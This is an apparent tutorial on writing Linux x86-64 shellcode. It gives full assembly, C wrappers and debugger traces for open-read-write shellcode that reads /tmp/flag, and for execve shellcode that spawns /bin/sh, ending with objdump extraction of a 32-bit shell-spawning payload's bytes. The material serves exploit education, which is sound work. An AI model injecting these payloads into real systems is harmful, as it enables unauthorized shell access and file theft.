## Explopit Tech: Shellcode

- [Explopit Tech: Shellcode](#explopit-tech-shellcode)
  - [Shellcode](#shellcode)
    - [What is "Acquiring a shell"?](#what-is-acquiring-a-shell)
  - [orw Shellcode](#orw-shellcode)
    - [1. int fd = open("/tmp/flag", RD\_ONLY, NULL);](#1-int-fd--opentmpflag-rd_only-null)
    - [2. read(fd, buf, 0x30)](#2-readfd-buf-0x30)
    - [3. write(1, buf, 0x30)](#3-write1-buf-0x30)
    - [Note: File Descriptor](#note-file-descriptor)
    - [Compiling orw Shellcode](#compiling-orw-shellcode)
    - [Run](#run)
    - [Debugging orw Shellcode](#debugging-orw-shellcode)
    - [1. int fd = open("/tmp/flag", O\_RDONLY, NULL)](#1-int-fd--opentmpflag-o_rdonly-null)
    - [2. read(fd, buf, 0x30)](#2-readfd-buf-0x30-1)
    - [3. write(1, buf, 0x30)](#3-write1-buf-0x30-1)
  - [execve Shellcode](#execve-shellcode)
    - [Compiling execve Shellcode and Run](#compiling-execve-shellcode-and-run)
    - [Extracting shellcode using objdump](#extracting-shellcode-using-objdump)

In the hacking field, attacking an opponent's system is called an **exploit**. The term "exploit" carries the meaning of <u>taking unfair advantage</u> of vulnerabilities in the target system.

---

### Shellcode

**Shellcode** refers to <u>a piece of assembly code</u> that is crafted for exploitation purposes. Commonly, shellcode is used for obtaining shell access to the target system.

#### What is "Acquiring a shell"?

"Aquiring a shell" refers to the process of <u>gaining command-line access</u> to a target system. When an attacker obtains shell access, they can execute commands directly on the compromised system, allowing them to navigate the file system.

If a hacker can move the `RIP` to shellcode they wrote, that means the hacker can do anything on the system.

Shellcode is architecture- and OS-dependent, often requiring custom implementation for optimal results. [Shared shellcodes](https://shell-storm.org/shellcode/index.html) exist but may not fully account for runtime conditions, so being able to write your own is essential.

Now we are going to look at **open-read-write (orw)** and **shell execution (execve)**.

### orw Shellcode

**orw Shellcode** <u>opens</u> a file, <u>reads</u> it, and <u>prints</u> them to the screen.

Let's assume that we want to implement this C code

```c
char buf[0x30];

int fd = open("/tmp/flag", O_RDONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

To implement orw shellcode, we need to understand these **syscalls**:

| syscall | rax  | arg0 (rdi)           | arg1 (rsi)      | arg2 (rdx)   |
| ------- | ---- | -------------------- | --------------- | ------------ |
| read    | 0x00 | unsigned int fd      | char *buf       | size_t count |
| write   | 0x01 | unsigned int fd      | const char *buf | size_t count |
| open    | 0x02 | const char *filename | int flags       | umode_t mode |

If we translate each line of that C code to assembly,

#### 1. int fd = open("/tmp/flag", RD_ONLY, NULL);

| syscall | rax  | arg0 (rdi)           | arg1 (rsi) | arg2 (rdx)   |
| ------- | ---- | -------------------- | ---------- | ------------ |
| open    | 0x02 | const char *filename | int flags  | umode_t mode |

The first thing we have to do is allocating the string `"/tmp/flag"` into memory. To do this, we will push `0x67616c662f706d742f` (the little-endian representation of `"/tmp/flag"`) onto the **stack**. However, since values can only be pushed onto the stack in 8-byte units, we first push `0x67` (1-byte), followed by `0x616c662f706d742f` (8-byte). Finally, we move `rsp` into `rdi` so that `rdi` points to the string.

```
// https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24
/* File access modes for `open' and `fcntl'.  */
#define        O_RDONLY        0        /* Open read-only.  */
#define        O_WRONLY        1        /* Open write-only.  */
#define        O_RDWR          2        /* Open read/write.  */
```

This code is not part of the actual shellcode but serves as a reference to explain how the shellcode works. It is a snippet from the `fcntl.h` header file in **glibc**, which defines the constants used for opening files in Linux/Unix systems. These constants specify the mode in which a file is opened when using the `open()` system call in shellcode: 

- **O_RDONLY (0):** Open the file in read-only mode
- **O_WRONLY (1):** Open the file in write-only mode
- **O_RDWR (2):** Open the file in read/write mode

In the shellcode example, `xor rsi, rsi` sets the `rsi` register to `0`, which corresponds to `O_RDONLY (0)`, indicating that the file should be opened in read-only mode.

```x86asm
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp  ; rdi = "/tmp/flag"
xor rsi, rsi  ; rsi = 0 ; RD_ONLY
xor rdx, rdx  ; rdx = 0
mov rax, 2    ; rax = 2 ; syscall_open
syscall       ; open("/tmp/flag", RD_ONLY, NULL)
```

- `rax`: sets the syscall number
- `rdi`: first argument (filename pointer)
- `rsi`: second argument (flags - O_RDONLY=0)
- `rdx`: third argument (mode - not used when opening for read only)
- `syscall`: triggers the system call, returns file descriptor in `rax`

#### 2. read(fd, buf, 0x30)

| syscall | rax  | arg0 (rdi)      | arg1 (rsi) | arg2 (rdx)   |
| ------- | ---- | --------------- | ---------- | ------------ |
| read    | 0x00 | unsigned int fd | char *buf  | size_t count |

The return value of a syscall is stored in the `rax` register. Therefore, the file descriptor obtained from opening "/tmp/flag" is stored in `rax`. Since this file descriptor needs to be the first argument to the `read` syscall, we move the value from `rax` to `rdi`.

For `rsi`, we need to point to a memory location where the read data will be stored. Since we're reading 0x30 bytes, we set `rsi` to `rsp-0x30` to allocate space on the stack.

The `rdx` register is set to 0x30, which specifies the number of bytes to read from the file.

Finally, to call the read syscall, we set `rax` to 0, which is the syscall number for read.

#### 3. write(1, buf, 0x30)

| syscall | rax  | arg0 (rdi)      | arg1 (rsi)      | arg2 (rdx)   |
| ------- | ---- | --------------- | --------------- | ------------ |
| write   | 0x01 | unsigned int fd | const char *buf | size_t count |

For the write syscall, we set `rdi` to `1`, which represents the standard output (stdout) file descriptor.

We keep the same values for `rsi` and `rdx` as used in the read syscall, since we want to write the same buffer with the same length (0x30 bytes).

Finally, we set `rax` to 1, which is the syscall number for write.

```x86asm
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

Putting everything together, the complete orw shellcode would be:

```x86asm
;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax      ; rsp will point to the top of the stack
mov rdi, rsp  ; rdi = "/tmp/flag"
xor rsi, rsi  ; rsi = 0 ; RD_ONLY
xor rdx, rdx  ; rdx = 0
mov rax, 2    ; rax = 2 ; syscall_open
syscall       ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax  ; rdi = fd (user opened-file)
mov rsi, rsp
sub rsi, 0x30 ; rsi = rsp-0x30 ; buf
mov rdx, 0x30 ; rdx = 0x30     ; len
mov rax, 0x0  ; rax = 0        ; syscall_read
syscall       ; read(fd, buf, 0x30)

mov rdi, 1    ; rdi = 1 ; fd = stdout
mov rax, 0x1  ; rax = 1 ; syscall_write
syscall       ; write(fd, buf, 0x30)
```

#### Note: File Descriptor

A file descriptor is an identifier in the form of a number that the operating system uses to manage **open files**.

- **0**: stdin
- **1**: stdout
- **2**: stderr
- **3 and above**: user-opened files, sockets, pipes, and other I/O resources

#### Compiling orw Shellcode

We have to compile `orw.S` assembly code into an `ELF` file so that it can be run on a linux system.

```c
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax    # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30   # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30   # rdx = 0x30     ; len\n"
    "mov rax, 0x0    # rax = 0        ; syscall_read\n"
    "syscall         # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1      # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1    # rax = 1 ; syscall_write\n"
    "syscall         # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi    # rdi = 0\n"
    "mov rax, 0x3c	 # rax = sys_exit\n"
    "syscall		 # exit(0)");

void run_sh();

int main() { run_sh(); }
```

#### Run

```console
$ echo 'flag{this_is_open_read_write_shellcode!}' > /tmp/flag
```

```console
$ gcc -o orw orw.c -masm=intel
$ ./orw
flag{this_is_open_read_write_shellcode!}
```

#### Debugging orw Shellcode

First, open `orw` with gdb, set a breakpoint on `run_sh()`, and type `run`.

```x86asm
...
 RSP  0x7fffffffd888 —▸ 0x55555555517c (main+14) ◂— mov eax, 0
 RIP  0x555555555119 (run_sh) ◂— push 0x67
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x555555555119 <run_sh>       push   0x67
   0x55555555511b <run_sh+2>     movabs rax, 0x616c662f706d742f     RAX => 0x616c662f706d742f ('/tmp/fla')
   0x555555555125 <run_sh+12>    push   rax
   0x555555555126 <run_sh+13>    mov    rdi, rsp                    RDI => 0x7fffffffd878 ◂— '/tmp/flag'
   0x555555555129 <run_sh+16>    xor    rsi, rsi                    RSI => 0
   0x55555555512c <run_sh+19>    xor    rdx, rdx                    RDX => 0
...
```

Now we can see that our shellcode is pointed to by `RIP`. Let's examine how the system calls work.

#### 1. int fd = open("/tmp/flag", O_RDONLY, NULL)

Set a breakpoint on `<run_sh+29>`.

```x86asm
 ► 0x555555555136 <run_sh+29>    syscall  <SYS_open>
        file: 0x7fffffffd878 ◂— '/tmp/flag'
        oflag: 0
        vararg: 0
```

The pwndbg plugin interprets syscall arguments as shown in above. This confirms our shellcode is executing `open("/tmp/flag", O_RDONLY, NULL)` as intended.

After running the syscall with the `ni` command, we can see that the file descriptor (3) for /tmp/flag is stored in the rax register, as expected from the open syscall.

```x86asm
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  3
...
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
...
   0x55555555512c <run_sh+19>    xor    rdx, rdx         RDX => 0
   0x55555555512f <run_sh+22>    mov    rax, 2           RAX => 2
   0x555555555136 <run_sh+29>    syscall  <SYS_open>
 ► 0x555555555138 <run_sh+31>    mov    rdi, rax         RDI => 3
```

#### 2. read(fd, buf, 0x30)

Set a breakpoint on `run_sh+55` where the second syscall is located.

```x86asm
 ► 0x555555555150 <run_sh+55>    syscall  <SYS_read>
        fd: 3 (/tmp/flag)
        buf: 0x7fffffffd848 ◂— 0
        nbytes: 0x30
```

The read syscall reads 0x30 bytes of data from the newly allocated file descriptor (3) for /tmp/flag and stores it at memory address 0x7fffffffe2c8. If we type `x/s 0x7fffffffe2c8`,

```x86asm
pwndbg> x/s 0x7fffffffe2c8
0x7fffffffe2c8: "flag{this_is_open_read_write_shellcode!}\n"
```

#### 3. write(1, buf, 0x30)

```x86asm
 ► 0x555555555160 <run_sh+71>    syscall  <SYS_write>
        fd: 1 (/dev/pts/2)
        buf: 0x7fffffffd848 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
        n: 0x30
```

(the address is changed in the second run for me btw)

When we execute the `ni` command, it outputs 48 bytes (0x30) from the memory address `0x7fffffffe2c8` where the data is stored.

`flag{this_is_open_read_write_shellcode!}`

---

### execve Shellcode

**execve shellcode** executes arbitrary programs, typically used to spawn a shell on the target system. When people refer to "shellcode" without further specification, they're usually talking about this type.

| syscall | rax  | arg0 (rdi)           | arg1 (rsi)              | arg2 (rdx)              |
| ------- | ---- | -------------------- | ----------------------- | ----------------------- |
| execve  | 0x3b | const char *filename | const char *const *argv | const char *const *envp |

The `argv` parameter represents <u>arguments passed to the executable</u>, while `envp` represents <u>environment variables</u>. For our purposes of just executing a shell, we can set both to `NULL`. In Linux, common executables are stored in the `/bin/` directory, including the shell program we want to execute.

Our goal is to create shellcode that executes execve("/bin/sh", null, null) to spawn a shell.

```x86asm
;Name: execve.S

mov rax, 0x68732f6e69622f ; hex representation of "/bin/sh"
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

- `rax`: 0x3b (syscall number for execve)
- `rdi`: pointer to the string "/bin/sh\x00" (filename to execute)
- `rsi`: NULL (argv array pointer - set to NULL in this simple case)
- `rdx`: NULL (envp array pointer - set to NULL in this simple case)
- `syscall`: triggers the system call to execute the program

#### Compiling execve Shellcode and Run

```c
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
```

#### Extracting shellcode using objdump

We can translate the shellcode into byte code (opcode).

```x86asm
; File name: shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```

```console
$ sudo apt-get install nasm 
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$ 
```